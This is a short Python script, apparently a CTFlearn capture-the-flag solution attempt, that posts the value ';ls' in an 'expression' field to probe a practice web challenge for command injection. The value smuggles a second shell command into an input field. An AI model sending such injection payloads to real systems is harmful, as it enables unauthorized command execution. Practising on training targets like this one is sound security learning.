import requests

url = "https://web.ctflearn.com/web7/"

data = {
  "expression": ";ls"
}

response = requests.post(url, data=data)

print(response.text)
